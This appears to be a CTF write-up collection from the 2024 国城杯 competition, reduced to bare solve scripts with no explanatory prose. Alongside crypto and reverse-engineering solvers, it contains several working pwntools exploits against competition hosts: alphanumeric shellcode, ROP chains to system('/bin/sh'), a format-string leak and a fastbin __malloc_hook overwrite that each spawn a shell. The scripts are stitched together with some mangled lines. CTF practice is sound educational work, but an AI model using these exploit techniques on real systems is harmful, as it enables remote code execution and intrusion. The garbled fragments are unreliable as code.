# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2024国城杯_writeup_by_Mini-Venom.md
# TITLE: 2024国城杯 writeup by Mini-Venom
# CATEGORY: pwn

import numpy as np
import cv2
import sys
import os

def decode(input_image, output_dir, seed_range):
    to_recover = cv2.imread(input_image, cv2.IMREAD_GRAYSCALE)
    
    if to_recover is None:
        print(f"Error: Unable to load image {input_image}")
        exit(1)

    to_recover_array = np.asarray(to_recover)
    
    # Loop through all possible seeds in the given range
    for seed in seed_range:
        np.random.seed(seed)
        
        row_indices = list(range(to_recover_array.shape[0]))
        col_indices = list(range(to_recover_array.shape[1]))

        # Reverse shuffle the row and column indices
        np.random.shuffle(row_indices)
        np.random.shuffle(col_indices)
        
        row_reverse = np.argsort(row_indices)
        col_reverse = np.argsort(col_indices)
        
        # Reverse the row and column shuffling
        recovered_image = to_recover_array[row_reverse, :]
        recovered_image = recovered_image[:, col_reverse]

        # Save the decoded image with the current seed as part of the filename
        output_image = os.path.join(output_dir, f"recovered_seed_{seed}.png")
        cv2.imwrite(output_image, recovered_image)
        print(f"Decoded image saved as {output_image}")

        # Add a check here if the result is good enough (e.g., using some similarity measure)
        # For example, you could compare pixel-wise similarity or use image metrics like SSIM
        # If a match is found, you can break the loop and stop further processing

def main():
    if len(sys.argv) != 4:
        print('error! Please provide input image path, output directory, and seed range as command-line arguments.')
        exit(1)
    
    input_image = sys.argv[1]
    output_dir = sys.argv[2]
    seed_start = int(sys.argv[3].split('-')[0])  # start of seed range
    seed_end = int(sys.argv[3].split('-')[1])    # end of seed range
    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    seed_range = range(seed_start, seed_end + 1)
    decode(input_image, output_dir, seed_range)

if __name__ == '__main__':
    main()
aaa=[
["00","aardvark","adroitness"],
["01","absurd","adviser"],
["02","accrue","aftermath"],
["03","acme","aggregate"],
["04","adrift","alkali"],
["05","adult","almighty"],
["06","afflict","amulet"],
["07","ahead","amusement"],
["08","aimless","antenna"],
["09","Algol","applicant"],
["0A","allow","Apollo"],
["0B","alone","armistice"],
["0C","ammo","article"],
["0D","ancient","asteroid"],
["0E","apple","Atlantic"],
["0F","artist","atmosphere"],
["10","assume","autopsy"],
["11","Athens","Babylon"],
["12","atlas","backwater"],
["13","Aztec","barbecue"],
["14","baboon","belowground"],
["15","backfield","bifocals"],
["16","backward","bodyguard"],
["17","banjo","bookseller"],
["18","beaming","borderline"],
["19","bedlamp","bottomless"],
["1A","beehive","Bradbury"],
["1B","beeswax","bravado"],
["1C","befriend","Brazilian"],
["1D","Belfast","breakaway"],
["1E","berserk","Burlington"],
["1F","billiard","businessman"],
["20","bison","butterfat"],
["21","blackjack","Camelot"],
["22","blockade","candidate"],
["23","blowtorch","cannonball"],
["24","bluebird","Capricorn"],
["25","bombast","caravan"],
["26","bookshelf","caretaker"],
["27","brackish","celebrate"],
["28","breadline","cellulose"],
["29","breakup","certify"],
["2A","brickyard","chambermaid"],
["2B","briefcase","Cherokee"],
["2C","Burbank","Chicago"],
["2D","button","clergyman"],
["2E","buzzard","coherence"],
["2F","cement","combustion"],
["30","chairlift","commando"],
["31","chatter","company"],
["32","checkup","component"],
["33","chisel","concurrent"],
["34","choking","confidence"],
["35","chopper","conformist"],
["36","Christmas","congregate"],
["37","clamshell","consensus"],
["38","classic","consulting"],
["39","classroom","corporate"],
["3A","cleanup","corrosion"],
["3B","clockwork","councilman"],
["3C","cobra","crossover"],
["3D","commence","crucifix"],
["3E","concert","cumbersome"],
["3F","cowbell","customer"],
["40","crackdown","Dakota"],
["41","cranky","decadence"],
["42","crowfoot","December"],
["43","crucial","decimal"],
["44","crumpled","designing"],
["45","crusade","detector"],
["46","cubic","detergent"],
["47","dashboard","determine"],
["48","deadbolt","dictator"],
["49","deckhand","dinosaur"],
["4A","dogsled","direction"],
["4B","dragnet","disable"],
["4C","drainage","disbelief"],
["4D","dreadful","disruptive"],
["4E","drifter","distortion"],
["4F","dropper","document"],
["50","drumbeat","embezzle"],
["51","drunken","enchanting"],
["52","Dupont","enrollment"],
["53","dwelling","enterprise"],
["54","eating","equation"],
["55","edict","equipment"],
["56","egghead","escapade"],
["57","eightball","Eskimo"],
["58","endorse","everyday"],
["59","endow","examine"],
["5A","enlist","existence"],
["5B","erase","exodus"],
["5C","escape","fascinate"],
["5D","exceed","filament"],
["5E","eyeglass","finicky"],
["5F","eyetooth","forever"],
["60","facial","fortitude"],
["61","fallout","frequency"],
["62","flagpole","gadgetry"],
["63","flatfoot","Galveston"],
["64","flytrap","getaway"],
["65","fracture","glossary"],
["66","framework","gossamer"],
["67","freedom","graduate"],
["68","frighten","gravity"],
["69","gazelle","guitarist"],
["6A","Geiger","hamburger"],
["6B","glitter","Hamilton"],
["6C","glucose","handiwork"],
["6D","goggles","hazardous"],
["6E","goldfish","headwaters"],
["6F","gremlin","hemisphere"],
["70","guidance","hesitate"],
["71","hamlet","hideaway"],
["72","highchair","holiness"],
["73","hockey","hurricane"],
["74","indoors","hydraulic"],
["75","indulge","impartial"],
["76","inverse","impetus"],
["77","involve","inception"],
["78","island","indigo"],
["79","jawbone","inertia"],
["7A","keyboard","infancy"],
["7B","kickoff","inferno"],
["7C","kiwi","informant"],
["7D","klaxon","insincere"],
["7E","locale","insurgent"],
["7F","lockup","integrate"],
["80","merit","intention"],
["81","minnow","inventive"],
["82","miser","Istanbul"],
["83","Mohawk","Jamaica"],
["84","mural","Jupiter"],
["85","music","leprosy"],
["86","necklace","letterhead"],
["87","Neptune","liberty"],
["88","newborn","maritime"],
["89","nightbird","matchmaker"],
["8A","Oakland","maverick"],
["8B","obtuse","Medusa"],
["8C","offload","megaton"],
["8D","optic","microscope"],
["8E","orca","microwave"],
["8F","payday","midsummer"],
["90","peachy","millionaire"],
["91","pheasant","miracle"],
["92","physique","misnomer"],
["93","playhouse","molasses"],
["94","Pluto","molecule"],
["95","preclude","Montana"],
["96","prefer","monument"],
["97","preshrunk","mosquito"],
["98","printer","narrative"],
["99","prowler","nebula"],
["9A","pupil","newsletter"],
["9B","puppy","Norwegian"],
["9C","python","October"],
["9D","quadrant","Ohio"],
["9E","quiver","onlooker"],
["9F","quota","opulent"],
["A0","ragtime","Orlando"],
["A1","ratchet","outfielder"],
["A2","rebirth","Pacific"],
["A3","reform","pandemic"],
["A4","regain","Pandora"],
["A5","reindeer","paperweight"],
["A6","rematch","paragon"],
["A7","repay","paragraph"],
["A8","retouch","paramount"],
["A9","revenge","passenger"],
["AA","reward","pedigree"],
["AB","rhythm","Pegasus"],
["AC","ribcage","penetrate"],
["AD","ringbolt","perceptive"],
["AE","robust","performance"],
["AF","rocker","pharmacy"],
["B0","ruffled","phonetic"],
["B1","sailboat","photograph"],
["B2","sawdust","pioneer"],
["B3","scallion","pocketful"],
["B4","scenic","politeness"],
["B5","scorecard","positive"],
["B6","Scotland","potato"],
["B7","seabird","processor"],
["B8","select","provincial"],
["B9","sentence","proximate"],
["BA","shadow","puberty"],
["BB","shamrock","publisher"],
["BC","showgirl","pyramid"],
["BD","skullcap","quantity"],
["BE","skydive","racketeer"],
["BF","slingshot","rebellion"],
["C0","slowdown","recipe"],
["C1","snapline","recover"],
["C2","snapshot","repellent"],
["C3","snowcap","replica"],
["C4","snowslide","reproduce"],
["C5","solo","resistor"],
["C6","southward","responsive"],
["C7","soybean","retraction"],
["C8","spaniel","retrieval"],
["C9","spearhead","retrospect"],
["CA","spellbind","revenue"],
["CB","spheroid","revival"],
["CC","spigot","revolver"],
["CD","spindle","sandalwood"],
["CE","spyglass","sardonic"],
["CF","stagehand","Saturday"],
["D0","stagnate","savagery"],
["D1","stairway","scavenger"],
["D2","standard","sensation"],
["D3","stapler","sociable"],
["D4","steamship","souvenir"],
["D5","sterling","specialist"],
["D6","stockman","speculate"],
["D7","stopwatch","stethoscope"],
["D8","stormy","stupendous"],
["D9","sugar","supportive"],
["DA","surmount","surrender"],
["DB","suspense","suspicious"],
["DC","sweatband","sympathy"],
["DD","swelter","tambourine"],
["DE","tactics","telephone"],
["DF","talon","therapist"],
["E0","tapeworm","tobacco"],
["E1","tempest","tolerance"],
["E2","tiger","tomorrow"],
["E3","tissue","torpedo"],
["E4","tonic","tradition"],
["E5","topmost","travesty"],
["E6","tracker","trombonist"],
["E7","transit","truncated"],
["E8","trauma","typewriter"],
["E9","treadmill","ultimate"],
["EA","Trojan","undaunted"],
["EB","trouble","underfoot"],
["EC","tumor","unicorn"],
["ED","tunnel","unify"],
["EE","tycoon","universe"],
["EF","uncut","unravel"],
["F0","unearth","upcoming"],
["F1","unwind","vacancy"],
["F2","uproot","vagabond"],
["F3","upset","vertigo"],
["F4","upshot","Virginia"],
["F5","vapor","visitor"],
["F6","village","vocalist"],
["F7","virus","voyager"],
["F8","Vulcan","warranty"],
["F9","waffle","Waterloo"],
["FA","wallet","whimsical"],
["FB","watchword","Wichita"],
["FC","wayside","Wilmington"],
["FD","willow","Wyoming"],
["FE","woodlark","yesteryear"],
["FF","Zulu","Yucatan"]]

_string = "crumpled chairlift freedom chisel island dashboard crucial kickoff crucial chairlift drifter classroom highchair cranky clamshell edict drainage fallout clamshell chatter chairlift goldfish chopper eyetooth endow chairlift edict eyetooth deadbolt fallout egghead chisel eyetooth cranky crucial deadbolt chatter chisel egghead chisel crumpled eyetooth clamshell deadbolt chatter chopper eyetooth classroom chairlift fallout drainage klaxon"

def tihuan(s):
    for i in aaa:
        s = s.replace(i[1],i[0])
        s = s.replace(i[2],i[0])
    return s

bbb = tihuan(_string)
print(bbb)
ccc = bbb.split(" ")
ddd = ""
for i in ccc:
    ddd+=chr(int(i,16))

print(ddd)
#!/usr/bin/env python
visit https://tool.lu/pyc/ for more information
Version: Python 3.8

def xor_encrypt(data, key):
    encrypted_data = bytearray()
    for i in range(len(data)):
        encrypted_data.append(data[i] ^ key[i % len(key)])
    return encrypted_data

def read_file(file_path):
    pass
WARNING: Decompyle incomplete

def write_file(file_path, data):
    pass
WARNING: Decompyle incomplete

def encrypt_file(input_file_path, output_file_path, key):
    data = read_file(input_file_path)
    encrypted_data = xor_encrypt(data, key)
    write_file(output_file_path, encrypted_data)

if name == '__main__':
    key = b'GCcup_wAngwaNg!!'
    input_file = 'flag4.png'
    encrypted_file = 'flag4_encrypted.bin'
    encrypt_file(input_file, encrypted_file, key)
#!/usr/bin/env python
# Version: Python 3.8

def xor_decrypt(encrypted_data, key):
    decrypted_data = bytearray()
    for i in range(len(encrypted_data)):
        decrypted_data.append(encrypted_data[i] ^ key[i % len(key)])
    return decrypted_data

def read_file(file_path):
    with open(file_path, 'rb') as f:
        return f.read()

def write_file(file_path, data):
    with open(file_path, 'wb') as f:
        f.write(data)

def decrypt_file(input_file_path, output_file_path, key):
    encrypted_data = read_file(input_file_path)
    decrypted_data = xor_decrypt(encrypted_data, key)
    write_file(output_file_path, decrypted_data)

if __name__ == '__main__':
    key = b'GCcup_wAngwaNg!!'
    input_file = 'flag4_encrypted.bin'
    decrypted_file = 'flag4_decrypted.png'
    decrypt_file(input_file, decrypted_file, key)
> python2 ./ALPHA3.py x64 ascii mixedcase rax --input="sandbox.bin"
QXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjKTYfi9630t800T810T860T870T880t8B0T8J0T8K0T8L0T8M0T8O0T8P0T8T0T8U0T8V0T8W0t8b0T8g0T8h0T8i0T8j0T8n0T8oRAPZ0t8C0t8E0t8H0t8R0t8S0t8Y0t8Z0t8c0t8e0t8fZRAQZ0T8lZjNTYfi9yb0t800t820T8O0T8P0T8Q0T8R0T8TRAPZ0t83ZHpzflagUUUPH17HKodHAf1RM1RhTTUUXZPHGGTUUUHGFVUUUjUHAbIGBUTUUjqXZP
#
from pwn import *
from struct import pack
from ctypes import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

    #p=process("./pwn1")
p=remote("125.70.243.22",31585)
elf=ELF("./pwn1")
p.recvuntil("Radiant powers, deadly tech. Here we go!")
payload=b'QXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjKTYfi9630t800T810T860T870T880t8B0T8J0T8K0T8L0T8M0T8O0T8P0T8T0T8U0T8V0T8W0t8b0T8g0T8h0T8i0T8j0T8n0T8oRAPZ0t8C0t8E0t8H0t8R0t8S0t8Y0t8Z0t8c0t8e0t8fZRAQZ0T8lZjNTYfi9yb0t800t820T8O0T8P0T8Q0T8R0T8TRAPZ0t83ZHpzflagUUUPH17HKodHAf1RM1RhTTUUXZPHGGTUUUHGFVUUUjUHAbIGBUTUUjqXZP'
p.send(payload)
inter()
from pwn import *
from struct import pack
from ctypes import *

def debug(c=None):
    if c:
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()

def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context.update(arch='amd64', os='linux')
p = process('./pwn2') 

p.recvuntil(b'Username:')
p.send(b'%7$s')
p.recvuntil(b'Welcome, n')
password = u64(p.recv(8))
libc_leak = p.recv(6).ljust(8, b'x00')
libc_base = u64(libc_leak) - 0x21b780
system, bin_sh = get_sb()

p.success(f"Leaked password: {password}")
p.success(f"Libc base address: {hex(libc_base)}")

p.recvuntil(b'password: n')
p.send(p64(password))

p.sendline("1111")
p.recvuntil("authentication code:")
p.sendline("1111")
p.recvuntil(b'>n')

rdi = 0x0000000000400661
payload = b'a' * 0x28
payload += p64(rdi + 1)
payload += p64(rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
from pwn import *
from struct import pack
from ctypes import *
import base64
    #from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
    #p = process('./pwn')
p=remote("125.70.243.22",31400)
elf = ELF('./pwn')
libc = ELF('libc.so.6')

def create(idx, size):
    sla(b'choice:n', b'1')
    sla(b'index:n', str(idx))
    sla(b'size:n', str(size))
def delete(idx):
    sla(b'choice:n', b'2')
    sla(b'index:n', str(idx))
def show(idx):
    sla(b'choice:n', b'4')
    sla(b'index:n', str(idx))
def edit(idx, data):
    sla(b'choice:n', b'3')
    sla(b'index:n', str(idx))
    sla(b'length:n',str(len(data)))
    sa(b'content:n', data)

create(0, 0x80)
create(1, 0x10)
delete(0)
show(0)
libc_base = uu64() - 0x68 - libc.sym['__malloc_hook']
lg('libc_base',libc_base)
system, binsh = get_sb()
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
ogg = libc_base + 0xd5c07

create(3, 0x60)
create(4, 0x60)
delete(4)
delete(3)
# fastbinY[0x70] -> chunk3 -> chunk4
edit(3, p64(malloc_hook - 0x23))
create(5, 0x60)
create(6, 0x60)

edit(6, b'x00'*0xb + p64(ogg) + p64(ogg))

    #debug('b *$rebase(0x13b1)')

create(7, 0x10)

    #pause()

lg('libc_base', libc_base)

    #debug()
inter()
from pwn import *
from struct import pack
import ctypes

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()

def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

p=remote("125.70.243.22",31378)
p.recvuntil(b"input yours id")
p.sendline(b'a')
libc=ELF("./libc.so.6")
cdll=ctypes.CDLL("./libc.so.6")
cdll.srand(cdll.time(0))
p.recvuntil("Input yours id authentication code:")
p.sendline(str(cdll.rand()))

p.recvuntil(b'4 wine')
p.sendline(str(-4))
p.recvuntil(b'which one to choose')
pay=p64(0x40133B)
p.send(pay)

p.recvuntil(b'wine')
p.sendline(str(-7))
p.send(b'a'*8)
p.recvuntil(b'succeed')
p.recvuntil(b'a'*8)
libc_base=u64(p.recv(6).ljust(8, b'x00'))-0x1147d0
print(hex(libc_base))
system=libc_base+libc.sym["system"]

p.recvuntil(b'4 wine')
p.sendline(str(-7))
p.send(p64(system))

p.recvuntil(b'4 wine')
p.sendline(str(-4))
p.recvuntil(b'which one to choose')
pay=p64(0x401511)
p.send(pay)

p.interactive()
private static Boolean check(String uri) throws IOException, ParserConfigurationException, SAXException {
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setNamespaceAware(true);
   DocumentBuilder builder = dbf.newDocumentBuilder();
   Document doc = builder.parse(uri);
   int tag1 = doc.getElementsByTagNameNS("*", "expr").getLength();
   int tag2 = doc.getElementsByTagNameNS("*", "import").getLength();
   int tag3 = doc.getElementsByTagNameNS("*", "include").getLength();
   int tag4 = doc.getElementsByTagNameNS("*", "invoke").getLength();
   int tag5 = doc.getElementsByTagNameNS("*", "invokeStatic").getLength();
   int tag6 = doc.getElementsByTagNameNS("*", "new").getLength();
   int tag7 = doc.getElementsByTagNameNS("*", "parse").getLength();
   int tag8 = doc.getElementsByTagNameNS("*", "set").getLength();
   int tag9 = doc.getElementsByTagNameNS("*", "setProperties").getLength();
   int tag10 = doc.getElementsByTagNameNS("*", "out").getLength();
   int tag11 = doc.getElementsByTagNameNS("*", "useBean").getLength();
   return tag1 <= 0 && tag2 <= 0 && tag3 <= 0 && tag4 <= 0 && tag5 <= 0 && tag6 <= 0 && tag7 <= 0 && tag8 <= 0 && tag9 <= 0 && tag10 <= 0 && tag11 <= 0 ? true : false;
}
    #sagemath

from Crypto.Util.number import *

def add(P, Q):

    (x1, y1) = P

    (x2, y2) = Q

    x3 = (x1*y2 + y1*x2) * inverse(1 + d*x1*x2*y1*y2, p) % p

    y3 = (y1*y2 - a*x1*x2) * inverse(1 - d*x1*x2*y1*y2, p) % p

    return (x3, y3)

def mul(x, P):

    Q = (0, 1)

    while x > 0:

        if x % 2 == 1:

            Q = add(Q, P)

        P = add(P, P)

        x = x >> 1

    return Q

p = 64141017538026690847507665744072764126523219720088055136531450296140542176327

a = 362

d = 7

e=0x10001

gx=bytes_to_long(b'D0g3xGC{*****************}')

PR.<y>=PolynomialRing(Zmod(p))

f=(d*gx^2-1)*y^2+(1-a*gx^2)

gy=int(f.roots()[0][0])

assert (a*gx^2+gy^2)%p==(1+d*gx^2*gy^2)%p

G=(gx,gy)

eG = mul(e, G)

print(eG)

    #eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)
//参考题目：https://www.cnblogs.com/Lovechan/articles/17704931.html

import math

n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489
d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009
c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175

x = math.gcd(n,pow(2,n*d,n)-2)
m = pow(c,d,x)
print(bytes.fromhex(hex(m)[2:]))
from secret import flag
from Crypto.Util.number import*
from gmpy2 import*

flag = b'D0g3xGC{****************}'

def gen_key(p, q):
    public_key = p*p*q
    e = public_key
    n = p*q
    phi_n = (p-1)*(q-1)
    private_key = inverse(e,phi_n)
    return public_key,private_key,e

p = getPrime(512)
q = getPrime(512)

N,d,e = gen_key(p,q)

c = gmpy2.powmod(bytes_to_long(flag),e,N)

print(N)
print(d)
print(c)

'''
n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489
d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009
c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175
'''
    #include <stdio.h>
    #include <string.h>
    #include <stdint.h> 
    #define DELTA 0x61C88647
    #define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[((p&3)^e)&0xff] ^ z))) 
void btea(uint32_t* v, int n, const uint32_t key[4])
{
    uint32_t y, z, sum; 
    unsigned p, rounds, e; 
    if (n > 1)            
    { 
        rounds = 6 + 52 / n; 
        sum = 0; 
        z = v[n - 1]; 
        do 
        { 
            sum -= DELTA; 
            e = (sum >> 2) & 3; 
            for (p = 0; p < n - 1; p++) 
            { 
                y = v[p + 1]; 
                z = v[p] += MX; 
            } 
            y = v[0]; 
            z = v[n - 1] += MX; 
        } 
        while (--rounds); 
    } 

    else if (n < -1)      
    { 
        n = -n; 
        rounds = 6 + 52 / n; 
        sum = -rounds * DELTA; 
        y = v[0]; 
        do 
        { 
            e = (sum >> 2) & 3; 
            for (p = n - 1; p > 0; p--) 
            { 
                z = v[p - 1]; 
                y = v[p] -= MX; 
            } 
            z = v[n - 1]; 
            y = v[0] -= MX; 
            sum += DELTA; 
        } 
        while (--rounds); 
    } 
} 
int main() { 
    unsigned char v[] = {0x8A, 0x4F, 0x76, 0x5A, 
0x77, 0xDF, 0xB0, 0x05, 
};
    int r = 2; 

    uint32_t k[4];
  k[0] = 0x5201314;
  k[1] = 0x52013140;
  k[2] = 0x5201314;
  k[3] = 0x52013140;
    btea(((uint32_t*)v),-r,k); 
    for (int i = 0; i < 8; i++) { 
        printf("%c",v[i]); 
    } 
    return 0; 
}
